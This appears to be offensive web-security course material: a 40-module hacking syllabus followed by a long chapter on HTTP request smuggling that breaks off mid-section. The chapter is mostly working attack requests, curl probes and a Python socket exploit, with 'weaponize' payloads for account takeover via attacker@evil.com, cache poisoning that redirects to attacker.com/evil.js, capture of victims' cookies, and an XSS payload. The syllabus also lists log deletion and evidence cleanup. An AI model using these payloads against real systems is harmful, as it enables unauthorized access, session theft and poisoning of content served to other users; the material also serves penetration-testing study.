# Syllabus

## MODULE 1: Reconnaissance & Information Gathering

- Domain enumeration (whois, dig, nslookup)
- DNS reconnaissance
- Port scanning (nmap)
- Web server fingerprinting
- Technology stack identification
- Google dorking
- Subdomain enumeration (sublist3r, amass, ffuf)
- Shodan queries
- OSINT techniques
- Wayback Machine analysis
- Certificate transparency logs

## MODULE 2: Web Server Basics & Architecture

- HTTP/HTTPS fundamentals
- Request-response cycle
- Status codes
- Headers and metadata
- URL structure and parsing
- Web server types (Apache, Nginx, IIS)
- Common configurations and misconfigurations
- Web application firewalls (WAF)

## MODULE 3: Authentication & Session Management

- Authentication mechanisms
- Session tokens and cookies
- JWT (JSON Web Tokens)
- OAuth 2.0
- SAML
- Session fixation
- Session prediction
- Cookie manipulation
- Token leakage
- Multi-factor authentication bypasses
- Default credentials
- Credential stuffing

## MODULE 4: SQL Injection (SQLi)

- SQL basics and queries
- In-band SQLi (Union-based, Error-based)
- Blind SQLi (Boolean-based, Time-based)
- Out-of-band SQLi
- Second-order SQLi
- Bypassing WAF filters
- SQLi in different contexts (WHERE, INSERT, UPDATE, DELETE)
- Database detection and enumeration
- Data extraction techniques
- Stacked queries
- SQLi tools (sqlmap, Burp Suite)

## MODULE 5: Cross-Site Scripting (XSS)

- XSS fundamentals
- Reflected XSS
- Stored XSS
- DOM-based XSS
- Payload encoding and obfuscation
- Context-aware payloads
- Breaking out of tags and attributes
- JavaScript execution contexts
- Content Security Policy (CSP) bypass
- XSS via SVG, images, event handlers
- Cookie stealing and session hijacking via XSS
- XSS tools and payloads

## MODULE 6: Cross-Site Request Forgery (CSRF)

- CSRF mechanics
- Token generation and validation
- SameSite cookie attribute
- CSRF with GET requests
- CSRF with POST requests
- Bypassing CSRF protection
- CSRF token prediction
- Clickjacking integration
- CSRF tools

## MODULE 7: Command Injection & Code Execution

- Command injection basics
- OS command metacharacters
- Filter bypass techniques
- Blind command injection
- Time-based detection
- Reverse shell generation
- Out-of-band exfiltration
- Code injection (eval, exec)
- Template injection
- Server-side template injection (SSTI)
- Expression language injection
- PHP object injection

## MODULE 8: File Upload Vulnerabilities

- File upload mechanisms
- Extension validation bypass
- MIME type spoofing
- Magic number bypass
- Polyglot files
- Path traversal via uploads
- Double extension attacks
- Null byte injection
- Race conditions in upload
- Executable file uploads
- Archive extraction vulnerabilities

## MODULE 9: Path Traversal & Directory Traversal

- Traversal sequences (.., /)
- Encoding bypass (URL, double URL, Unicode)
- Absolute path specifications
- Null byte injection
- Backslash exploitation
- Case sensitivity bypass
- Platform-specific traversal
- Accessing sensitive files (/etc/passwd, /etc/shadow, web.config)
- Log file poisoning

## MODULE 10: Broken Access Control

- Insecure Direct Object References (IDOR)
- Horizontal privilege escalation
- Vertical privilege escalation
- Role-based access control (RBAC) bypass
- Function-level access control bypass
- Missing authorization checks
- Parameter manipulation
- Predictable IDs
- Mass assignment vulnerabilities

## MODULE 11: Security Misconfiguration

- Default credentials and configurations
- Unnecessary services enabled
- Directory listing enabled
- Verbose error messages
- Security headers missing
- Debug mode enabled
- Exposed configuration files
- Backup file exposure
- Unpatched software
- Insecure CORS configuration
- X-Frame-Options bypass

## MODULE 12: Sensitive Data Exposure

- Information disclosure
- Source code exposure
- Credentials in comments
- API key exposure
- Database connection strings
- Private key exposure
- Sensitive data in client-side code
- Insecure transmission
- Unencrypted storage
- Metadata extraction (EXIF, metadata)
- Git repository exposure

## MODULE 13: XML & Deserialization Attacks

- XML External Entity (XXE) injection
- XXE blind attacks
- SSRF via XXE
- Out-of-band data exfiltration
- Java deserialization exploits
- Python pickle exploitation
- .NET deserialization
- PHP object injection
- Gadget chain exploitation

## MODULE 14: Business Logic Flaws

- Price manipulation
- Race conditions
- Order fulfillment bypass
- Inventory manipulation
- Refund exploitation
- Account verification bypass
- Email verification bypass
- OTP bypass
- Rate limit bypass
- Workflow state bypass
- Calculation errors

## MODULE 15: API Exploitation

- RESTful API basics
- API authentication weaknesses
- API rate limiting bypass
- API versioning exploitation
- SOAP injection
- GraphQL injection and enumeration
- Insecure API endpoints
- Mass assignment in APIs
- API key exposure
- API parameter pollution

## MODULE 16: Server-Side Request Forgery (SSRF)

- SSRF mechanics
- Internal network scanning via SSRF
- Cloud metadata exploitation (AWS, GCP, Azure)
- Bypassing SSRF filters
- Localhost bypass techniques
- IP address encoding bypass
- File protocol exploitation
- Gopher protocol exploitation
- Data exfiltration via SSRF

## MODULE 17: Insecure Deserialization & Type Confusion

- Type juggling
- Weak type comparison
- Serialized object manipulation
- Remote code execution via deserialization
- Bypass protection mechanisms

## MODULE 18: Advanced SQL Injection

- Stacked queries and multi-query execution
- SQL operators and functions for data extraction
- Database-specific exploitation (MySQL, PostgreSQL, MSSQL, Oracle)
- SQLi in ORDER BY clause
- SQLi in JOIN clauses
- Second-order SQLi detection
- Polyglot SQLi payloads
- NoSQL injection
- Query chaining

## MODULE 19: Advanced XSS Techniques

- Mutation-based XSS
- Browser quirks and parsing differences
- XSS in different contexts (SVG, MathML, data URLs)
- Bypassing WAF and filters
- Unicode and encoding exploits
- Event handler exploitation
- Script gadgets
- DOM clobbering

## MODULE 20: WebSocket Exploitation

- WebSocket protocol basics
- WebSocket handshake
- Message manipulation
- Cross-Site WebSocket Hijacking (CSWSH)
- WebSocket enumeration
- Real-time data interception

## MODULE 21: HTTP Request Smuggling

- HTTP/1.1 fundamentals
- CL.TE and TE.CL attacks
- TE.TE obscuration
- Cache poisoning via smuggling
- Request splitting
- Desynchronization attacks

## MODULE 22: Click Jacking & UI Redressing

- Clickjacking mechanics
- Frame busting bypass
- UI element manipulation
- Dragging and dropping attacks
- Cursorjacking
- X-Frame-Options bypass

## MODULE 23: Subdomain Takeover

- Dangling DNS records
- CNAME misconfiguration
- Service-specific takeover (GitHub, Heroku, AWS S3)
- Domain expiration exploitation
- Verification bypass

## MODULE 24: Server-Side Template Injection (SSTI)

- Template engine identification
- Expression language injection
- Code execution via templates
- Jinja2, Mako, ERB exploitation
- Freemarker SSTI
- Velocity template injection

## MODULE 25: Prototype Pollution

- JavaScript prototype chain
- Prototype pollution via GET/POST
- Gadget exploitation
- JSON pollution
- Server-side prototype pollution

## MODULE 26: Race Conditions

- Timing windows
- TOCTOU (Time-of-Check-Time-of-Use)
- Concurrent request exploitation
- Account enumeration via race conditions
- Distributed race conditions
- Burp Turbo Intruder usage

## MODULE 27: Cryptographic Failures

- Weak hashing algorithms
- Predictable encryption
- Weak random number generation
- Cryptographic side-channel attacks
- Weak key management
- JWT cryptographic issues

## MODULE 28: SSL/TLS Vulnerabilities

- SSL/TLS downgrade attacks
- Certificate validation bypass
- Heartbleed
- POODLE
- BEAST
- CRIME
- Certificate pinning bypass
- Self-signed certificate exploitation

## MODULE 29: Open Redirect

- Parameter-based redirects
- Whitelist bypass
- Double encoding
- Protocol-based bypasses (javascript:, data:)
- Meta refresh exploitation
- JavaScript-based redirects

## MODULE 30: Kali Linux Tools & Utilities

- Burp Suite (Professional & Community)
- OWASP ZAP
- sqlmap
- Nikto
- Nessus
- OpenVAS
- Metasploit Framework
- hashcat
- John the Ripper
- Hydra
- curl and wget
- netcat
- Wireshark
- tcpdump
- Python scripting for exploitation
- Custom payload generation

## MODULE 31: Encoding & Obfuscation Bypass

- URL encoding
- Double URL encoding
- HTML entity encoding
- Base64 encoding
- Unicode normalization
- Hex encoding
- Octal encoding
- Backslash escaping
- Polymorphic payloads

## MODULE 32: Authentication Bypass Techniques

- Default credential lists
- Brute force attacks
- Dictionary attacks
- Weak password policies
- Authentication logic flaws
- Account enumeration
- Password reset flaws
- Verification email bypass
- Two-factor authentication bypass

## MODULE 33: Privilege Escalation (Web Context)

- Horizontal escalation to admin
- Vertical escalation techniques
- Role manipulation
- Permission inheritance flaws
- Function-level authorization bypass
- Post-authentication exploits

## MODULE 34: Exploit Development & Payload Crafting

- Shellcode generation
- Reverse shell techniques
- Bind shell techniques
- Web shell generation
- Obfuscated payloads
- Polymorphic code
- Evasion techniques
- Msfvenom usage

## MODULE 35: Web Scraping & Automation

- Automated testing frameworks
- Selenium for dynamic content
- Beautiful Soup and requests library
- Scrapy for large-scale scraping
- Automated reconnaissance
- Mass vulnerability detection

## MODULE 36: Logging, Monitoring & Forensics

- Log manipulation and deletion
- Log poisoning
- Clearing browser history and artifacts
- Evidence cleanup
- Identifying detection mechanisms
- Intrusion detection evasion

## MODULE 37: Defense & Detection Avoidance

- WAF fingerprinting and bypass
- IDS/IPS evasion
- Anti-bot detection bypass
- Proxy detection bypass
- VPN and anonymization
- Timing attacks to avoid detection

## MODULE 38: Post-Exploitation & Persistence

- Reverse shell stabilization
- Privilege escalation from shell
- Persistence mechanisms
- Backdoor installation
- Lateral movement
- Data exfiltration techniques

## MODULE 39: CTF-Specific Techniques

- Flag format identification
- Source code analysis
- Decompilation and reverse engineering
- Binary exploitation basics
- Memory analysis
- Steganography basics

## MODULE 40: Real-World Integration

- Bug bounty methodology
- CVSS scoring
- Vulnerability assessment workflow
- Exploit chaining
- Multi-stage attacks
- End-to-end exploitation scenarios

---


---

# HTTP Request Smuggling

## HTTP/1.1 Fundamentals

### HTTP Message Structure

**Basic Request Format**

```http
POST /api/endpoint HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

param=value
```

**Critical Headers**

```http
Content-Length: 13          # Specifies exact byte count of message body
Transfer-Encoding: chunked  # Indicates chunked encoding format
Connection: keep-alive      # Persistent connection for request pipelining
Host: target.com           # Required in HTTP/1.1
```

### Content-Length Processing

**Calculation Rules**

```http
POST /submit HTTP/1.1
Host: target.com
Content-Length: 28

username=admin&password=test
```

Byte count includes:

- `username=admin&password=test` = 28 bytes
- Does NOT include `\r\n` after headers
- Must be exact for proper message boundary detection

**Multiple Content-Length Headers**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 5
Content-Length: 6

test
```

Different servers handle this differently:

- Some use first value (5)
- Some use last value (6)
- Some reject as invalid
- Creates desynchronization opportunity

### Transfer-Encoding: Chunked

**Chunked Encoding Format**

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

5\r\n
Hello\r\n
6\r\n
World!\r\n
0\r\n
\r\n
```

Format breakdown:

- `5\r\n` - Chunk size in hexadecimal (5 bytes)
- `Hello\r\n` - Chunk data + CRLF
- `0\r\n\r\n` - Zero-sized chunk signals end

**Chunk Extensions**

```http
Transfer-Encoding: chunked

a;name=value\r\n
0123456789\r\n
0\r\n
\r\n
```

Extensions after size: `a;name=value`

- Semicolon separates size from metadata
- Most servers ignore extensions
- Can be used for obfuscation

### Connection Persistence

**Keep-Alive Behavior**

```http
GET /page1 HTTP/1.1
Host: target.com
Connection: keep-alive

HTTP/1.1 200 OK
Content-Length: 100
...

GET /page2 HTTP/1.1
Host: target.com
...
```

Same TCP connection reused:

- Reduces latency
- Enables request pipelining
- Creates smuggling opportunities when message boundaries misaligned

**Request Pipelining**

```http
GET /1 HTTP/1.1\r\n
Host: target.com\r\n
\r\n
GET /2 HTTP/1.1\r\n
Host: target.com\r\n
\r\n
```

Multiple requests sent without waiting for responses:

- Server must process in order
- Vulnerable if request boundaries miscalculated

---

## Fundamentals of HTTP Request Smuggling

### Core Concept

HTTP Request Smuggling exploits discrepancies in how front-end servers (reverse proxies, load balancers, CDNs) and back-end servers parse HTTP request boundaries. When these systems disagree about where one request ends and another begins, attackers can "smuggle" requests that appear hidden to the front-end but are processed by the back-end.

**Critical Headers:**

```http
Content-Length: 44
Transfer-Encoding: chunked
```

**[Inference]** When both headers are present, RFC 7230 mandates that `Transfer-Encoding` should take precedence, but many implementations handle this differently.

### Attack Variants

#### CL.TE (Content-Length → Transfer-Encoding)

Front-end uses `Content-Length`, back-end uses `Transfer-Encoding`.

**Detection Request:**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

**Explanation:**

- Front-end reads 6 bytes (`0\r\n\r\nX`) and forwards
- Back-end processes chunked encoding, sees `0` as chunk size (end of request)
- The `X` byte remains in buffer and prepends to next request

**Exploitation Pattern:**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

**Step-by-step:**

1. Front-end counts 44 bytes total
2. Back-end sees chunk size `0`, ending request immediately
3. `GET /admin HTTP/1.1\r\nX-Ignore: X` becomes start of next user's request

#### TE.CL (Transfer-Encoding → Content-Length)

Front-end uses `Transfer-Encoding`, back-end uses `Content-Length`.

**Detection Request:**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

**Explanation:**

- Front-end processes chunked encoding completely
- Back-end reads only 3 bytes (`8\r\n`)
- `SMUGGLED\r\n0\r\n\r\n` remains for next request

**Exploitation Pattern:**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

**Breakdown:**

- `5c` (92 in decimal) = length of smuggled content
- `GPOST` - the `G` completes the 4-byte Content-Length requirement
- `POST /...` becomes the smuggled request

#### TE.TE (Transfer-Encoding Obfuscation)

Both servers support `Transfer-Encoding`, but one can be induced to ignore it via obfuscation.

**Obfuscation Techniques:**

```http
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked 
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
Transfer-Encoding: chunked, identity
Transfer-encoding: chunked
```

**Detection Pattern:**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

**[Inference]** Some implementations only recognize the first `Transfer-Encoding` header, others process multiple headers differently, and case sensitivity or whitespace variations can cause one server to ignore the header.

---

## CL.TE and TE.CL Attacks

### CL.TE (Content-Length → Transfer-Encoding)

**Attack Pattern**

Front-end server uses Content-Length, back-end uses Transfer-Encoding.

**Basic CL.TE Smuggling**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Interpretation:

- Front-end (CL): Reads 6 bytes (`0\r\n\r\nG`) and forwards entire request
- Back-end (TE): Processes chunked, sees `0\r\n\r\n` as end, leaves `G` in buffer
- Next request from front-end is prefixed with `G`

**Exploiting CL.TE**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 49
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Foo: x
```

Execution flow:

1. Front-end forwards entire message (49 bytes)
2. Back-end processes chunk `0\r\n\r\n`, stops
3. Remaining bytes poison next legitimate request:
    
    ```http
    GET /admin HTTP/1.1Host: target.comFoo: xGET / HTTP/1.1Host: target.com...
    ```
    

**Confirming CL.TE Vulnerability**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q
```

Detection:

- If vulnerable: timeout (waiting for chunk terminator)
- Front-end thinks body is 4 bytes: `1\r\nZ`
- Back-end expects chunk: reads `1\r\nZ\r\nQ` then waits for more data

**Tool: Turbo Intruder CL.TE Detection**

```python
# Burp Suite Extension: Turbo Intruder
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100,
                          pipeline=False)
    
    # CL.TE detection request
    attack = '''POST / HTTP/1.1
Host: %s
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q''' % target.req.headers['Host']
    
    engine.queue(attack)
    engine.queue(target.req)  # Normal request
    
# If second request times out, CL.TE exists
```

### TE.CL (Transfer-Encoding → Content-Length)

**Attack Pattern**

Front-end server uses Transfer-Encoding, back-end uses Content-Length.

**Basic TE.CL Smuggling**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

Interpretation:

- Front-end (TE): Processes chunks (`8` bytes, then `0` terminator)
- Back-end (CL): Reads first 3 bytes only (`8\r\n`), leaves rest in buffer
- Next request poisoned with: `SMUGGLED\r\n0\r\n\r\n`

**Exploiting TE.CL**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
POST /admin HTTP/1.1
Host: target.com
Content-Length: 15

x=1
0


```

Breakdown:

- `5c` hex = 92 bytes (the smuggled request)
- Front-end forwards all chunks
- Back-end reads 4 bytes (`5c\r\n`), stops
- Smuggled request prepended to victim's request

**Confirming TE.CL Vulnerability**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

Detection:

- Front-end processes chunk (ends at `0\r\n\r\n`)
- Back-end reads 6 bytes: `0\r\n\r\nX\r\n`
- If `X` causes error in next request, TE.CL confirmed

**Burp Suite: HTTP Request Smuggler Extension**

```bash
# Install from BApp Store
# Automatic detection and exploitation

# Detection scan on target:
# 1. Passive scan identifies potential issues
# 2. Active scan confirms with timing attacks
# 3. Suggests attack variants
```

### Exploitation Techniques

**Bypassing Front-End Security Controls**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 120
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
Content-Length: 10

x=
```

Result:

- Front-end security check passes (sees POST to `/`)
- Smuggled `GET /admin` reaches back-end with spoofed IP

**Capturing Other Users' Requests**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

POST /logger HTTP/1.1
Host: target.com
Content-Length: 500

```

Attack flow:

1. Smuggled POST expects 500-byte body
2. Victim's next request becomes the "body"
3. Logger endpoint stores victim's full request
4. Attacker retrieves stored data including cookies, headers

**Web Cache Poisoning**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /js/analytics.js HTTP/1.1
Host: target.com

HTTP/1.1 302 Found
Location: https://attacker.com/evil.js
Content-Length: 0


```

If cache between front-end and back-end:

- Smuggled request poisons cache entry
- All users receive malicious redirect

**Session Hijacking**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 180
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: target.com
Content-Length: 100

username=victim&password=
```

Victim's password appended to smuggled login attempt.

## TE.TE Obscuration

### Obfuscation Techniques

**Duplicate Transfer-Encoding Headers**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 50
Transfer-Encoding: chunked
Transfer-Encoding: identity

0

GET /admin HTTP/1.1
...
```

Server behavior varies:

- Some use first `Transfer-Encoding`
- Some use last
- Some reject request
- Creates desync if front-end ≠ back-end choice

**Whitespace Manipulation**

```http
Transfer-Encoding: chunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked 
Transfer-Encoding:chunked
Transfer-Encoding	: chunked
```

Variations:

- Space before colon
- Space after colon
- Tab characters
- Trailing whitespace

**Case Variation**

```http
Transfer-Encoding: chunked
transfer-encoding: chunked
Transfer-encoding: chunked
TRANSFER-ENCODING: chunked
Transfer-Encoding: Chunked
Transfer-Encoding: CHUNKED
```

Some servers are case-sensitive in header processing.

**Invalid Header Values**

```http
Transfer-Encoding: chunked, identity
Transfer-Encoding: chunked, chunked
Transfer-Encoding: identity, chunked
Transfer-Encoding: chunked;
Transfer-Encoding: x-chunked
Transfer-Encoding: chunk
```

Parsing differences:

- Some accept only exact "chunked"
- Some normalize values
- Some process first/last token

**Vertical Tab and Other Characters**

```http
Transfer-Encoding: chunked
Transfer-Encoding:\x0bchunked
Transfer-Encoding:\x0cchunked
Transfer-Encoding: chu\x00nked
```

Null bytes and control characters may be:

- Ignored by some parsers
- Cause header rejection by others

**Header Folding (Deprecated)**

```http
Transfer-Encoding: 
 chunked
Transfer-Encoding:\r\n
 chunked
```

Obsolete in HTTP/1.1 but some servers still accept.

### TE.TE CL.TE Hybrid Attacks

**Making Front-End Ignore TE**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked
Transfer-Encoding: identity

0

X
```

Goal: Front-end rejects `Transfer-Encoding: identity` as invalid, falls back to CL.

**Making Back-End Ignore TE**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked
Transfer-Encoding: cow

0

X
```

If back-end doesn't recognize "cow", ignores Transfer-Encoding entirely.

**Conflicting Specifications**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 50
Transfer-Encoding: xchunked
Transfer-Encoding: chunked

0

SMUGGLED
```

Front-end might process `xchunked` as invalid, use CL. Back-end processes second `Transfer-Encoding: chunked`.

### Detection Methodology

**Timing-Based Detection**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q
```

Inject request expecting more data:

- Vulnerable: Connection times out waiting for chunk completion
- Not vulnerable: Error or immediate response

**Differential Response Detection**

```http
# Request 1: Normal
POST / HTTP/1.1
Host: target.com
Content-Length: 10

param=test

# Request 2: Smuggle attempt with known-bad path
POST / HTTP/1.1
Host: target.com
Content-Length: 80
Transfer-Encoding: chunked

0

GET /nonexistent HTTP/1.1
Host: target.com
Content-Length: 5

x=1
```

If second request causes 404 in victim's response, smuggling confirmed.

**Tool: smuggler.py**

```bash
# Clone tool
git clone https://github.com/defparam/smuggler.git
cd smuggler

# Basic scan
python3 smuggler.py -u https://target.com

# Verbose output
python3 smuggler.py -u https://target.com -v

# Test specific mutation
python3 smuggler.py -u https://target.com -m CL.TE

# With custom headers
python3 smuggler.py -u https://target.com -H "X-Custom: value"
```

**Tool: h2csmuggler (HTTP/2 to HTTP/1.1)**

```bash
# HTTP/2 downgrade attacks
git clone https://github.com/BishopFox/h2csmuggler.git
cd h2csmuggler

# Scan target
python3 h2csmuggler.py -x https://target.com

# Generate smuggling requests
python3 h2csmuggler.py -x https://target.com --test
```

### Advanced Obfuscation Patterns

**Chunk Size Obfuscation**

```http
Transfer-Encoding: chunked

00000000000A
0123456789
0
```

Leading zeros in chunk size (valid per RFC but may confuse parsers).

**Chunk Extension Abuse**

```http
Transfer-Encoding: chunked

A;name="value with spaces and \"quotes\""
0123456789
0;trailing=extension
```

Complex extensions that some parsers mishandle.

**Mixed Line Endings**

```http
POST / HTTP/1.1\r\n
Host: target.com\r\n
Transfer-Encoding: chunked\n
\r\n
0\r\n
\r\n
```

Mixing `\r\n` and `\n` line endings.

**Header Name Manipulation**

```http
Transfer-Encoding: chunked
Transfer-Encoding[]: chunked
Transfer-Encoding{}: chunked
Transfer-Encoding<>: chunked
```

Special characters that may be stripped or cause parsing errors.

**UTF-8 BOM in Headers**

```http
\xEF\xBB\xBFTransfer-Encoding: chunked
Transfer-Encoding: \xEF\xBB\xBFchunked
```

Byte Order Mark may be ignored by some parsers.

### Exploitation Workflow

**Step 1: Identify Smuggling**

```bash
# Use automated scanner
python3 smuggler.py -u https://target.com -v

# Manual confirmation with timing
curl -X POST https://target.com \
  -H "Content-Length: 4" \
  -H "Transfer-Encoding: chunked" \
  -d $'1\r\nZ\r\nQ' \
  --max-time 10
```

**Step 2: Determine Variant**

```bash
# Test CL.TE
curl -X POST https://target.com \
  -H "Content-Length: 6" \
  -H "Transfer-Encoding: chunked" \
  -d $'0\r\n\r\nG'

# Test TE.CL
curl -X POST https://target.com \
  -H "Content-Length: 3" \
  -H "Transfer-Encoding: chunked" \
  -d $'8\r\nSMUGGLED\r\n0\r\n\r\n'
```

**Step 3: Craft Exploit**

```python
#!/usr/bin/env python3
import socket
import ssl
import time

def send_smuggle(host, port, use_ssl=True):
    # CL.TE attack to access /admin
    smuggle = (
        b"POST / HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Content-Length: 120\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        b"0\r\n"
        b"\r\n"
        b"GET /admin HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Content-Length: 10\r\n"
        b"\r\n"
        b"x="
    )
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if use_ssl:
        context = ssl.create_default_context()
        sock = context.wrap_socket(sock, server_hostname=host)
    
    sock.connect((host, port))
    sock.sendall(smuggle)
    time.sleep(1)
    
    # Send normal request (will be poisoned)
    normal = b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n"
    sock.sendall(normal)
    
    response = sock.recv(4096)
    print(response.decode())
    sock.close()

send_smuggle('target.com', 443)
```

**Step 4: Weaponize**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

POST /account/settings HTTP/1.1
Host: target.com
Content-Length: 300

email=attacker@evil.com&submit=1
```

Change victim's email to attacker-controlled address for account takeover.

### Defense Evasion

**Bypass Length Validation**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 5
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Foo: bar
```

Short Content-Length to avoid "suspicious large request" detection.

**Fragment Across Multiple Connections**

```python
# Send smuggle prefix
requests.post('https://target.com', 
    headers={'Content-Length': '150', 'Transfer-Encoding': 'chunked'},
    data='0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\nX: ')

# Wait for connection reuse
time.sleep(2)

# Victim request completes smuggled request
```

**Slowloris-Style Smuggling**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Content-Length: 1000

[slow transmission of body]
```

Trickle data to keep connection open, maximize smuggling window.

### Testing Checklist

```markdown
[ ] Test CL.TE variant
    [ ] Basic detection (timeout test)
    [ ] Confirm with differential response
    [ ] Test with various Content-Length values

[ ] Test TE.CL variant
    [ ] Basic detection (error injection)
    [ ] Confirm with response capture
    [ ] Test with various chunk sizes

[ ] Test TE.TE obfuscations
    [ ] Duplicate Transfer-Encoding
    [ ] Whitespace variations
    [ ] Case variations
    [ ] Invalid values (identity, cow, etc.)
    [ ] Tab/control characters
    [ ] Header name mutations

[ ] Exploitation vectors
    [ ] Bypass front-end controls
    [ ] Access restricted endpoints
    [ ] Capture victim requests
    [ ] Poison cache
    [ ] Session hijacking
    [ ] Parameter pollution

[ ] Test via different channels
    [ ] Direct connection
    [ ] Through CDN/proxy
    [ ] Load balancer behavior
    [ ] Different HTTP methods (GET, POST, PUT)
```

### Key Tools Summary

```bash
# Burp Suite Extensions
HTTP Request Smuggler      # Auto-detection and exploitation
Turbo Intruder            # Custom timing attacks

# Standalone Tools
smuggler.py               # Automated scanner
h2csmuggler              # HTTP/2 downgrade attacks
tiscripts                # Tim's smuggling scripts

# Manual Testing
curl                     # Craft raw requests
nc / ncat                # Low-level TCP control
Python requests          # Scripted attacks
```

### HTTP/2 Considerations

HTTP/2 uses binary framing and doesn't rely on Content-Length or Transfer-Encoding in the same way. However:

```http
# HTTP/2 → HTTP/1.1 downgrade vulnerabilities
# Front-end speaks HTTP/2, back-end HTTP/1.1

:method: POST
:path: /
:authority: target.com
content-length: 50

# Downgrade may introduce smuggling if headers mishandled
```

**Related Topics**: HTTP/2 Request Smuggling (H2.CL, H2.TE), WebSocket Smuggling, Cache Poisoning via Request Smuggling, SSRF via Request Smuggling

---

## Cache Poisoning via Smuggling

### Web Cache Deception via Smuggling

**Concept:** Smuggle a request that poisons the cache with sensitive data, which is then served to other users.

#### Basic Cache Poisoning Attack

**Target Scenario:** Application reflects user-specific data in responses that are cached.

**Attack Request (CL.TE):**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /profile HTTP/1.1
Host: target.com
X-Forwarded-For: attacker.com

GET /static/innocent.js HTTP/1.1
Host: target.com


```

**Attack Flow:**

1. Smuggled `GET /profile` executes as victim's request
2. Response includes victim's sensitive profile data
3. `GET /static/innocent.js` is appended to the response chain
4. Cache stores the combined response under `/static/innocent.js` key
5. Other users requesting `/static/innocent.js` receive victim's profile data

#### Advanced Cache Poisoning Techniques

**Poisoning with Redirect Response:**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 87
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

GET /static/app.js HTTP/1.1
Host: target.com


```

**If `/admin` redirects:**

```http
HTTP/1.1 302 Found
Location: /login?redirect=/admin
```

**Result:** `app.js` cache entry contains redirect, breaking the application for all users.

### Cache Key Poisoning

**Exploiting Cache Key Construction:**

Many caches use simplified keys (e.g., `host + path`) ignoring headers.

**Attack Pattern:**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 180
Transfer-Encoding: chunked

0

GET /api/data HTTP/1.1
Host: target.com
X-User-Id: 1234

GET /static/cached.css HTTP/1.1
Host: target.com
X-Poisoned: <script>alert(document.domain)</script>


```

**Scenario:**

- Response to `/api/data` includes user-specific data
- If `/static/cached.css` is cached with this response
- XSS payload in `X-Poisoned` may be reflected and cached

### Double Request Smuggling for Cache Poisoning

**Concept:** Chain two smuggled requests to control both the cached key and content.

**Attack (TE.CL):**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

87
GET /admin/secret HTTP/1.1
Host: target.com
Content-Length: 20

x=
0

GET /public/index.html HTTP/1.1
Host: target.com


```

**Process:**

1. First smuggled request: `GET /admin/secret` (restricted endpoint)
2. Second victim request completes the `Content-Length: 20` body with their request
3. Response from `/admin/secret` is cached under `/public/index.html`

---

## Request Splitting

Request splitting exploits applications that forward or process HTTP requests based on user input, allowing injection of HTTP headers or complete requests.

### CRLF Injection for Request Splitting

**Vulnerable Pattern:**

```python
# Vulnerable code example
user_input = request.GET['url']
proxy_request = f"GET {user_input} HTTP/1.1\r\nHost: internal-service\r\n\r\n"
```

**Attack Payload:**

```
